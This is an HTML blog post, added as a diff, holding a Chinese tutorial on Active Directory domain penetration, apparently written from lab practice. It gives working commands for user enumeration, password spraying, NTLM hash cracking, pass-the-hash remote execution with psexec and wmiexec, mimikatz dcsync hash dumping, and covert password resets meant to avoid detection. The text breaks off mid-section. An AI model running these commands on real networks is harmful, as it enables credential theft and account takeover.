@@ -1,0 +1,1191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="yuBetter">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://example.com/2024/02/29/域渗透/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="域渗透所处内网环境工作组如何发现域端口扫描查询139、445、88、389是否开启 88、389是处于域控下的 这样就能判断是否存在域环境 凭据信息查看一些凭据信息 cmdkey &#x2F;list、mimikatz抓取的信息 我这边没有凭据信息  mimikzta收集信息  DNS服务器可以根据dns服务器的命名来判断是否有域，因为一般域控是作为域内的dns服务器来的 有时候工作组的机器用来域">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透">
+<meta property="og:url" content="https://example.com/2024/02/29/%E5%9F%9F%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="域渗透所处内网环境工作组如何发现域端口扫描查询139、445、88、389是否开启 88、389是处于域控下的 这样就能判断是否存在域环境 凭据信息查看一些凭据信息 cmdkey &#x2F;list、mimikatz抓取的信息 我这边没有凭据信息  mimikzta收集信息  DNS服务器可以根据dns服务器的命名来判断是否有域，因为一般域控是作为域内的dns服务器来的 有时候工作组的机器用来域">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230809095856180.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813151315451.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813152400588.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813153147984.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230809101831741.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813161448876.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317202047275.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813163332126.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813163407947.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813163553614.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813164136598.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813164304054.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813164438706.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813165735129.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813170132283.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813172344806.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813172450287.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813181147179.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813181607999.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813181742730.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813182226695.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813182340010.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813183052518.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813183251293.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813184424791.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2e69c11052ca3f45e6ed166b0a86ed8f.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ea7756068b739208f63908f1a2c2e4d0.png">
+<meta property="article:published_time" content="2024-02-29T13:33:17.000Z">
+<meta property="article:modified_time" content="2024-02-29T13:34:25.146Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230809095856180.png">
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/yubetter.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/yubetter.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/yubetter.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            域渗透 -
+        
+        Yu&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/fonts.css">
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[""]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"好好学习，天天向上","subtitle":{"text":["有远大志向而脚踏实地，有障碍失败而不言放弃","静以修生，俭以养德，非淡泊无以明志，非宁静无以致远","即使慢，驰而不息，纵会落后，纵会失败，但一定可以达到他所向的目标","穷且益坚，不坠青云之志","莫不有始，鲜克有终","靡不有初,鲜克有终"],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/yuBetter","instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":false,"position":"left","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Yu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+             
+                <div class="article-title">         
+                    <img src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/DEBBD2927DED307A3489909FB9F70489.jpg" alt="域渗透" />
+                    <h1 class="article-title-cover">域渗透</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/yubetter-logon.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">yuBetter</span>
+                            
+                                <span class="author-label"></span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-02-29 21:33:17</span>
+        <span class="mobile">2024-02-29 21:33</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-02-29 21:34:25</span>
+            <span class="mobile">2024-02-29 21:34</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>6.1k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>23 Mins</span>
+        </span>
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="所处内网环境"><a href="#所处内网环境" class="headerlink" title="所处内网环境"></a>所处内网环境</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><h4 id="如何发现域"><a href="#如何发现域" class="headerlink" title="如何发现域"></a>如何发现域</h4><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>查询139、445、88、389是否开启</p>
+<p>88、389是处于域控下的</p>
+<p>这样就能判断是否存在域环境</p>
+<h5 id="凭据信息"><a href="#凭据信息" class="headerlink" title="凭据信息"></a>凭据信息</h5><p>查看一些凭据信息</p>
+<p>cmdkey &#x2F;list、mimikatz抓取的信息</p>
+<p>我这边没有凭据信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230809095856180.png"
+                      alt="image-20230809095856180"
+                ></p>
+<p>mimikzta收集信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813151315451.png"
+                      alt="image-20230813151315451"
+                ></p>
+<h5 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h5><p>可以根据dns服务器的命名来判断是否有域，因为一般域控是作为域内的dns服务器来的</p>
+<p>有时候工作组的机器用来域的到那时服务器</p>
+<h5 id="网络设备、堡垒机等系统"><a href="#网络设备、堡垒机等系统" class="headerlink" title="网络设备、堡垒机等系统"></a>网络设备、堡垒机等系统</h5><p>显示一些网络拓扑的信息，堡垒机会存在一些主机的信息，可能有些域内主机、域控也会接入堡垒机的</p>
+<h5 id="看内网服务"><a href="#看内网服务" class="headerlink" title="看内网服务"></a>看内网服务</h5><p>在一些内网的服务当中，可能有些服务是通过ldap认证的所以很可能就会存在域环境（邮件服务器）</p>
+<p>exchange</p>
+<h4 id="如何横向"><a href="#如何横向" class="headerlink" title="如何横向"></a>如何横向</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>收集一些如wiki、密码本、抓取hash、rdp凭据等信息</p>
+<p>利用 一些口令复用&#x2F;hash传递（pth）</p>
+<h5 id="攻击域网段的机器"><a href="#攻击域网段的机器" class="headerlink" title="攻击域网段的机器"></a>攻击域网段的机器</h5><p>端口扫描定位到域用户机器，看是否开放其他服务，如何看有什么漏洞（MS17-010），最后进行漏洞利用拿下域控</p>
+<p>直接找到域控，看是否能漏洞利用</p>
+<p>域用户枚举，在攻击者不在域内，通过域内的用户枚举</p>
+<p>通过域内密码喷洒</p>
+<h6 id="利用kerbrute，进行域内用户枚举"><a href="#利用kerbrute，进行域内用户枚举" class="headerlink" title="利用kerbrute，进行域内用户枚举"></a>利用kerbrute，进行域内用户枚举</h6><p>原理：kerberos是一种认证协议，在第一阶段AS_REQ中当用户不存在时，返回包提示错误，用户存在时，密码正确，密码错误时返回包都不一样</p>
+<p>利用这一点就可以枚举出域内用户</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">三种状态的错误代码分别为：</span><br><span class="line"></span><br><span class="line">KRB5DC_ERR_PREAUTH_REQUIRED           需要额外的预认证（用户存在）</span><br><span class="line">KRB5DC_ERR_CLIENT_REVOKED                  客户端凭证已被吊销（禁用 ）</span><br><span class="line">KRB5DC_ERR_C_PRINCIPAL_U</span><br><span class="line"></span><br><span class="line">NKNOWN    在Kerberos数据库中找不到客户端（不存在）</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br><span class="line">kerbrute_windows_amd64.exe  userenum --dc 192.168.30.10 -d hack-my.com user.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813152400588.png"
+                      alt="image-20230813152400588"
+                ></p>
+<h6 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h6><p>在常规的爆破中，一般都是用很多密码取碰撞一个账户，很容易导致账号被锁定，密码喷洒时用一个密码去碰撞很多的账号，这个能有效避免账号被锁定</p>
+<p><strong>喷洒原理</strong></p>
+<p>就是在确认用户存在过后就会发送一个AS_REQ请求去，密码正确就会返回一个AS_REP，否则返回</p>
+<p>KRB5KDC_ERP_PREAUTH_FAILED</p>
+<p>1.kerbrute工具</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 192.168.30.10 -d hack-my.com user.txt Admin！@#45（密码）</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813153147984.png"
+                      alt="image-20230813153147984"
+                ></p>
+<p>2.ADPwdSpray.py</p>
+<p>优点：可以利用hash值进行喷洒</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">针对明文进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.30.10 hack-my.com user.txt clearpassword Admin！@#45(密码) tcp</span><br><span class="line"> </span><br><span class="line">针对哈希进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.30.10 hack-my.com user.txt ntlmhash afffeba176210fad4628f0524bfe1942（密码hash） udp</span><br></pre></td></tr></table></figure></div>
+
+<p>3.DomainPasswordSpray.ps1</p>
+<p>该工具需要在powershell环境中使用，powershell4.0不可用</p>
+<p>这个工具是利用LDAP从域中导出用户列表，然后去掉被锁定的用户，再用固定密码进行密码喷洒</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">自动从域中导出用户列表</span><br><span class="line">powershell -exec bypass</span><br><span class="line">Import-Module .\DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password Admin！@#45（密码）</span><br><span class="line">指定用户列表，指定单个密码进行爆破</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -password yuwin2012.com（密码）</span><br><span class="line">指定用户、密码列表进行爆破，输出到特定文件中</span><br><span class="line"></span><br><span class="line">依次使用密码对账号进行匹配，简称喷洒</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -PasswordList pass.txt</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h5 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h5><p>观察是否有域成员的进程—窃取token</p>
+<p>当我们拿到一个服务器权限，可能是个服务账号权限较低，通过提权获取到机器账号，机器账号在域内是可以执行域内命令的，执行看是否横向到域</p>
+<h5 id="通过堡垒机、vcenter等集权系统"><a href="#通过堡垒机、vcenter等集权系统" class="headerlink" title="通过堡垒机、vcenter等集权系统"></a>通过堡垒机、vcenter等集权系统</h5><h3 id="在域内"><a href="#在域内" class="headerlink" title="在域内"></a>在域内</h3><p>通过一些查询命令来获取</p>
+<p>ipconfig &#x2F;all</p>
+<p>net time &#x2F;domain等</p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><h3 id="连接域控LDAP"><a href="#连接域控LDAP" class="headerlink" title="连接域控LDAP"></a>连接域控LDAP</h3><p>ADExplorer</p>
+<p>可以利用这个工具连接到域控的LDAP可以根据OU去定位关键部门，关键人员，比如运维人员，或者去查看一些敏感资料</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230809101831741.png"
+                      alt="image-20230809101831741"
+                ></p>
+<h3 id="用户凭据收集"><a href="#用户凭据收集" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h3><p>域内单机密码和哈希值</p>
+<p>rdp凭据</p>
+<p>浏览器的信息</p>
+<p>xshell&#x2F;navicat</p>
+<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>BloodHound是一款强大的域内环境分析工具</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound" >https://github.com/BloodHoundAD/BloodHound <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>通过一款工具可以即将ADExpolorer生成的导出文件转换成BloodHound可解析的格式</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/c3c/ADExplorerSnapshot.py" >https://github.com/c3c/ADExplorerSnapshot.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>然后就可以利用这个工具进行域内分析</p>
+<h2 id="域内横向移动"><a href="#域内横向移动" class="headerlink" title="域内横向移动"></a>域内横向移动</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>利用wiki、密码本，抓取本机hash、rdp凭据等信息</p>
+<p>可以利用口令复用&#x2F;pth哈希传递</p>
+<p>也可以生成密码字典碰撞</p>
+<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>windows2012之后系统默认关闭wigest，攻击者无法从内存中获取明文密码，2012之前的版本如果安装KB2871997补丁。也会导致这样</p>
+<h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><p>所以有一种方法就是我们可以利用hashcat对获取到的hash进行爆破</p>
+<p>—爆破命令：hashcat -a 0 -m 1000 hash file –force</p>
+<p>—-a, –attack-mode&#x3D;NUM         攻击模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。（这里是字典攻击）</p>
+<p>— -m 1000指向的是NTLM Hash哈希协议</p>
+<p>—hash是要破解的哈希字符串，file为字典的地址</p>
+<h4 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h4><h6 id="psexec-py"><a href="#psexec-py" class="headerlink" title="psexec.py"></a>psexec.py</h6><p>利用smb服务可以通过明文或者hash传递来远程执行，必要条件是445端口要开启和Admin$共享</p>
+<p>主要连接到SMB服务端的Admin$共享，并且释放psexesvc.exe，注册PSEXESVC服务，然后通过PSEXESVC服务进行命令执行</p>
+<p>简要来说就是用这些工具来远程得到目标主机的system权限</p>
+<p>存在两种连接方式：</p>
+<ol>
+<li>先有 ipc 链接，psexec 需要明文或hash 传递</li>
+</ol>
+<p>先建立ipc连接：<code>net use \\192.168.30.10\ipc$ &quot;Admin!@#45&quot; /user:administrator（密码是前期信息收集获取）</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813161448876.png"
+                     
+                ></p>
+<p>然后利用psexec打开cmd，运行即可</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec \\192.168.3.32 -s cmd</span><br></pre></td></tr></table></figure></div>
+
+<p>2.不用建立IPC直接提供明文账户密码（推荐原因：建立IPC链接可能会失败）</p>
+<p><code>psexec --accepteula \\192.168.3.21 -u（用户） administrator -p（密码） Admin12345 -s（系统权限） cmd（运行cmd） </code></p>
+<p>如果没有明文密码，只有hash密码的话官方的pstools不能使用，这时候就需要使用impacket中别人二改的psexec.exe</p>
+<p>psexec.exe -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#x33;&#46;&#51;&#x32;" >&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#x33;&#46;&#51;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<h6 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h6><p><code>wmiexec HACK-MY/Administrator:Admin!@#45@192.168.30.10</code>连接域内主机，就可以远程命令控制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317202047275.png"
+                      alt="image-20230317202047275"
+                ></p>
+<h6 id="atexec-py"><a href="#atexec-py" class="headerlink" title="atexec.py"></a>atexec.py</h6><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>提权</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813163332126.png"
+                      alt="image-20230813163332126"
+                ></p>
+<p>如何获取密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813163407947.png"
+                      alt="image-20230813163407947"
+                ></p>
+<h4 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h4><h3 id="中继"><a href="#中继" class="headerlink" title="中继"></a>中继</h3><h3 id="知道ntlm如何修改原有的账户密码"><a href="#知道ntlm如何修改原有的账户密码" class="headerlink" title="知道ntlm如何修改原有的账户密码"></a>知道ntlm如何修改原有的账户密码</h3><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>1.拿下域控之后，获取到运维人员的hash，但是解密不出明文密码，但是需要明文密码登陆一些核心系统，如邮件服务器，堡垒机，使用域身份认证的系统</p>
+<p>2.拿下域控之后，目标机器只能通3389，445等端口不通（PTH行不通），想上去翻看文件</p>
+<p>3.拿下域控之后，获取到所有域用户的hash，发现内网中的云桌面（员工使用云桌面办公）走域认证，想登陆云桌面上去翻看文件，但是很多hash解密不出明文密码</p>
+<p>注意：通过域管&#x2F;域控去直接修改对应用户的密码，但是容易被发现密码被修改了</p>
+<p>解决方案：登陆目标系统之后，再将目标密码还原</p>
+<h6 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h6><p>通过mimikatz的setntlm重置密码，然后再还原</p>
+<p>先查看目标用户的hash值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:hack-my.com /all /csv</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813163553614.png"
+                      alt="image-20230813163553614"
+                ></p>
+<p>administartor的密码hash是38fe728ae616f0fde13715e7c320685f</p>
+<p>重置密码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::setntlm /server:&lt;域控IP或完整域名&gt; /user:&lt;username&gt; /password:&lt;新的密码&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>lsadump::setntlm &#x2F;server:192.168.30.10 &#x2F;user:administrator &#x2F;password:123456</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813164136598.png"
+                      alt="image-20230813164136598"
+                ></p>
+<p>然后就可以利用修改后的密码登入系统，密码为123456成功登陆进去</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813164304054.png"
+                      alt="image-20230813164304054"
+                ></p>
+<p>登陆目标系统后，再通过以下命令还原密码</p>
